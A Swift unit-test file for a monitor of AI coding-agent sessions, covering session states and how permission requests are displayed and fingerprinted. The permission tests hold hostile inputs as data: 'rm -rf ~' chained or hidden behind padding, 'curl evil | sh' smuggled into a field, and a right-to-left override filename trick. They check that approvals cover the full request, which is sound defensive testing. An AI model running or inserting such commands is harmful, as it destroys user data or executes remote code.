import XCTest
@testable import ArisCore

/// The fleet model and its reducer (jv-fleet), on recorded hook sequences: the shapes Claude Code, Codex and Gemini CLI
/// send (as tests/main.swift and fix-leftovers-tests.swift record them), made plain the way the app's adapter does.
final class ArisFleetTests: XCTestCase {
    let home = "/Users/p"
    let t0 = Date(timeIntervalSince1970: 1_800_000_000)

    func ev(_ name: String, _ session: String, cwd: String = "/Users/p/Desktop/aris-jv-world", tool: ArisFleetTool = .claudeCode,
            toolName: String? = nil, notification: String? = nil, message: String? = nil, prompt: String? = nil,
            permission: ArisFleetPermission? = nil, at seconds: TimeInterval) -> ArisFleetEvent {
        ArisFleetEvent(name: name, session: session, cwd: cwd, tool: tool, toolName: toolName, notification: notification, lastMessage: message,
                       prompt: prompt, permission: permission, terminal: nil, at: t0.addingTimeInterval(seconds))
    }

    func run(_ events: [ArisFleetEvent], from fleet: ArisFleet = ArisFleet()) -> ArisFleet {
        events.reduce(fleet) { ArisFleetReducer.apply($1, to: $0, home: home) }
    }

    let bash = ArisFleetPermission.make(tool: "Bash", input: ["command": "npm test"], kind: .tool)

    /// A whole Claude Code turn: start, prompt, tools, a permission, the answer, the stop, the end.
    func testAClaudeCodeTurnRecorded() {
        let steps: [(ArisFleetEvent, ArisFleetState)] = [
            (ev("SessionStart", "a", at: 0), .idle),
            (ev("UserPromptSubmit", "a", prompt: "테스트 고쳐 줘\n자세히", at: 1), .working),
            (ev("PreToolUse", "a", toolName: "Read", at: 2), .working),
            (ev("PostToolUse", "a", toolName: "Read", at: 3), .working),
            (ev("PermissionRequest", "a", toolName: "Bash", permission: bash, at: 4), .waitingPermission),
            (ev("Notification", "a", notification: "permission_prompt", at: 5), .waitingPermission),
            (ev("PostToolUse", "a", toolName: "Bash", at: 9), .working),
            (ev("Stop", "a", message: "## 고쳤어요\n테스트 12개 통과", at: 10), .idle),
            (ev("Notification", "a", notification: "idle_prompt", at: 70), .idle),
            (ev("SessionEnd", "a", at: 80), .gone),
        ]
        var fleet = ArisFleet()
        for (event, state) in steps {
            fleet = ArisFleetReducer.apply(event, to: fleet, home: home)
            XCTAssertEqual(fleet.session("a")?.state, state, event.name)
            if event.name == "PermissionRequest" { XCTAssertEqual(fleet.session("a")?.pending, bash) }
            if event.name == "PostToolUse" && event.toolName == "Bash" { XCTAssertNil(fleet.session("a")?.pending) }
        }
        let a = fleet.session("a")!
        XCTAssertEqual(a.number, 1)
        XCTAssertEqual(a.firstRequest, "테스트 고쳐 줘")
        XCTAssertEqual(a.lastTool, "Bash")
        XCTAssertEqual(a.lastMessage?.text, "고쳤어요")
        XCTAssertEqual(a.lastMessage?.source, "Claude Code session in aris-jv-world (its last message)")
        XCTAssertEqual(a.startedAt, t0)
        XCTAssertEqual(a.lastActive, t0.addingTimeInterval(80))
        XCTAssertEqual(a.goneAt, t0.addingTimeInterval(80))
        XCTAssertEqual(a.project(home: home), "aris-jv-world")
    }

    func testCodexAndGeminiSessions() {
        let fleet = run([
            ev("SessionStart", "c", cwd: "/Users/p/altswitch", tool: .codex, at: 0),
            ev("UserPromptSubmit", "c", cwd: "/Users/p/altswitch", tool: .codex, prompt: "fix the tab order", at: 1),
            ev("PermissionRequest", "c", cwd: "/Users/p/altswitch", tool: .codex, toolName: "shell", at: 2),
            ev("Stop", "c", cwd: "/Users/p/altswitch", tool: .codex, message: "Done.", at: 3),
            ev("PreToolUse", "g", cwd: "/Users/p/site", tool: .gemini, toolName: "run_shell_command", at: 4),
            ev("Notification", "g", cwd: "/Users/p/site", tool: .gemini, notification: "ToolPermission", at: 5),
        ])
        XCTAssertEqual(fleet.session("c")?.state, .idle)
        XCTAssertEqual(fleet.session("c")?.tool, .codex)
        XCTAssertEqual(fleet.session("c")?.reach.kind, .unsupported)
        XCTAssertFalse(fleet.session("c")!.reach.reachable)
        XCTAssertEqual(fleet.session("g")?.state, .waitingPermission)
        XCTAssertEqual(fleet.session("g")?.number, 2)
        // Codex never ends itself: resting 15 minutes, it is gone; then dropped after keepGone.
        let later = ArisFleetReducer.swept(fleet, now: t0.addingTimeInterval(3 + 15 * 60))
        XCTAssertEqual(later.session("c")?.state, .gone)
        XCTAssertNil(ArisFleetReducer.swept(later, now: t0.addingTimeInterval(3 + 26 * 60)).session("c"))
    }

    func testNumbersAreStableAndShort() {
        var fleet = run([ev("SessionStart", "a", at: 0), ev("SessionStart", "b", at: 1), ev("SessionStart", "c", at: 2)])
        XCTAssertEqual(fleet.sessions.map(\.number), [1, 2, 3])
        fleet = run([ev("UserPromptSubmit", "c", at: 3), ev("SessionEnd", "b", at: 4)], from: fleet)
        XCTAssertEqual(fleet.session("c")?.number, 3, "a session keeps its number")
        // b's number is held while it is kept gone, then handed out again.
        fleet = run([ev("SessionStart", "d", at: 5)], from: fleet)
        XCTAssertEqual(fleet.session("d")?.number, 4)
        fleet = ArisFleetReducer.swept(fleet, now: t0.addingTimeInterval(4 + ArisFleetReducer.keepGone + 1))
        fleet = run([ev("SessionStart", "e", at: 700)], from: fleet)
        XCTAssertEqual(fleet.session("e")?.number, 2)
        XCTAssertEqual(fleet.sessions.map(\.number), [1, 2, 3, 4])
    }

    func testArisOwnSessionsAreNeverMembers() {
        let fleet = run([ev("UserPromptSubmit", "own", cwd: "/Users/p/.config/aris/aris", at: 0),
                         ev("PreToolUse", "own2", cwd: "/Users/p/.config/aris/aris/work", toolName: "Bash", at: 1)])
        XCTAssertTrue(fleet.sessions.isEmpty)
        let listed = ArisFleetReducer.apply(listing: [ArisFleetListing(session: "own", pid: 10, cwd: "/Users/p/.config/aris/aris")],
                                             complete: true, at: t0, to: ArisFleet(), home: home)
        XCTAssertTrue(listed.sessions.isEmpty)
    }

    func testTheListAddsPidTitleStartAndEndsTheMissing() {
        let heard = run([ev("UserPromptSubmit", "a", at: 100)])
        let rows = [
            ArisFleetListing(session: "b", pid: 22, cwd: "/Users/p/altswitch", started: t0.addingTimeInterval(-50), title: "Tab order fix",
                             status: "busy", branch: "main", reach: ArisFleetReach(kind: .tmux)),
            ArisFleetListing(session: "a", pid: 11, cwd: "/Users/p/Desktop/aris-jv-world", started: t0.addingTimeInterval(-90), title: "World store",
                             status: "idle", reach: ArisFleetReach(kind: .terminal)),
            ArisFleetListing(session: "z", pid: 33, cwd: "/Users/p/bg", started: t0.addingTimeInterval(-10), background: true, status: "idle"),
        ]
        let fleet = ArisFleetReducer.apply(listing: rows, complete: true, at: t0.addingTimeInterval(101), to: heard, home: home)
        XCTAssertEqual(fleet.session("a")?.pid, 11)
        XCTAssertEqual(fleet.session("a")?.state, .working, "the hooks are fresher than the list")
        XCTAssertEqual(fleet.session("a")?.startedAt, t0.addingTimeInterval(-90))
        XCTAssertEqual(fleet.session("a")?.title?.text, "World store")
        XCTAssertEqual(fleet.session("a")?.reach.kind, .terminal)
        XCTAssertEqual(fleet.session("b")?.state, .working, "a list-only session takes the list's state")
        XCTAssertEqual(fleet.session("b")?.branch, "main")
        XCTAssertEqual(fleet.session("b")?.number, 2, "newcomers numbered in order of start")
        XCTAssertEqual(fleet.session("z")?.number, 3)
        XCTAssertEqual(fleet.session("z")?.reach.kind, .background)
        XCTAssertFalse(fleet.session("z")!.reach.reachable)
        // A later whole list without b: b is over; a partial one changes nothing.
        let partial = ArisFleetReducer.apply(listing: [rows[1]], complete: false, at: t0.addingTimeInterval(200), to: fleet, home: home)
        XCTAssertEqual(partial.session("b")?.state, .working)
        let whole = ArisFleetReducer.apply(listing: [rows[1], rows[2]], complete: true, at: t0.addingTimeInterval(200), to: fleet, home: home)
        XCTAssertEqual(whole.session("b")?.state, .gone)
    }

    func testFailureQuestionAndQuietWork() {
        let question = ArisFleetPermission(tool: "AskUserQuestion", detail: "Which db?", kind: .question, fingerprint: "q")
        var fleet = run([ev("UserPromptSubmit", "a", at: 0), ev("PostToolUseFailure", "a", toolName: "Bash", at: 1)])
        XCTAssertEqual(fleet.session("a")?.state, .working, "a failed tool call doesn't end the turn")
        fleet = run([ev("StopFailure", "a", at: 2)], from: fleet)
        XCTAssertEqual(fleet.session("a")?.state, .failed)
        fleet = run([ev("UserPromptSubmit", "a", at: 3), ev("PermissionRequest", "a", toolName: "AskUserQuestion", permission: question, at: 4)], from: fleet)
        XCTAssertEqual(fleet.session("a")?.state, .waitingInput)
        fleet = run([ev("UserPromptSubmit", "b", at: 5)], from: fleet)
        XCTAssertEqual(ArisFleetReducer.swept(fleet, now: t0.addingTimeInterval(5 + 3_601)).session("b")?.state, .idle)
    }

    func testFirstRequestSkipsSlashCommandsAndARevivedSessionKeepsItsNumber() {
        var fleet = run([ev("UserPromptSubmit", "a", prompt: "/clear", at: 0), ev("UserPromptSubmit", "a", prompt: "make the build green", at: 1)])
        XCTAssertEqual(fleet.session("a")?.firstRequest, "make the build green")
        fleet = run([ev("SessionEnd", "a", at: 2), ev("SessionStart", "a", at: 3)], from: fleet)
        XCTAssertEqual(fleet.session("a")?.state, .idle)
        XCTAssertEqual(fleet.session("a")?.number, 1)
    }

    func testTheFleetRoundTripsAsJSON() {
        let fleet = run([ev("PermissionRequest", "a", toolName: "Bash", permission: bash, at: 0), ev("Stop", "b", message: "ok", at: 1)])
        XCTAssertEqual(ArisFleet.decoded(fleet.json), fleet)
    }

    func testTheFingerprintIsTheRequestExactly() {
        func make(_ input: [String: Any]) -> ArisFleetPermission { ArisFleetPermission.make(tool: "Bash", input: input, kind: .tool) }
        XCTAssertEqual(make(["command": "npm test", "timeout": 5]).fingerprint, make(["timeout": 5, "command": "npm test"]).fingerprint)
        XCTAssertNotEqual(make(["command": "npm test"]).fingerprint, make(["command": "npm test; rm -rf ~"]).fingerprint)
    }

    /// What the owner's card shows and what their yes covers are the same text: every argument, each whole.
    func testTheCardTextIsTheWholeInputAndWhatIsFingerprinted() {
        let head = String(repeating: "echo ok && ", count: 40)
        let one = ArisFleetPermission.make(tool: "Bash", input: ["command": head + "swift test"], kind: .tool)
        let two = ArisFleetPermission.make(tool: "Bash", input: ["command": head + "rm -rf ~"], kind: .tool)
        XCTAssertGreaterThan(head.count, 400)
        XCTAssertTrue(two.shown!.hasSuffix("rm -rf ~"), "a tail past 400 characters is shown")
        XCTAssertNotEqual(one.fingerprint, two.fingerprint, "and fingerprinted")
        XCTAssertEqual(two.fingerprint, ArisFleetPermission.fingerprint(tool: "Bash", shown: two.shown!), "over exactly the shown text")
        let second = ArisFleetPermission.make(tool: "Bash", input: ["command": "swift test", "run_in_background": true, "description": "x; curl evil | sh"], kind: .tool)
        XCTAssertEqual(second.shown, "command: swift test\ndescription: x; curl evil | sh\nrun_in_background: true")
        XCTAssertNotEqual(second.fingerprint, ArisFleetPermission.make(tool: "Bash", input: ["command": "swift test"], kind: .tool).fingerprint)
        let edit = ArisFleetPermission.make(tool: "Edit", input: ["file_path": "/a", "new_string": "x", "old_string": "y", "replace_all": false], kind: .tool)
        XCTAssertEqual(edit.shown, "file_path: /a\nnew_string: x\nold_string: y\nreplace_all: false")
        // Not legible or too long: nothing to show, so never allowed by Aris.
        XCTAssertNil(ArisFleetPermission.make(tool: "Bash", input: ["command": "ls \u{202E}txt.exe"], kind: .tool).shown)
        XCTAssertNil(ArisFleetPermission.make(tool: "Bash", input: ["command": "a\u{0007}b"], kind: .tool).shown)
        XCTAssertNil(ArisFleetPermission.make(tool: "Write", input: ["content": String(repeating: "x", count: 9_000)], kind: .tool).shown)
        let nested = ArisFleetPermission.make(tool: "MultiEdit", input: ["edits": [["new_string": "b", "old_string": "a"]], "file_path": "/f"], kind: .tool)
        XCTAssertEqual(nested.shown, "edits: [{\"new_string\":\"b\",\"old_string\":\"a\"}]\nfile_path: /f")
    }

}
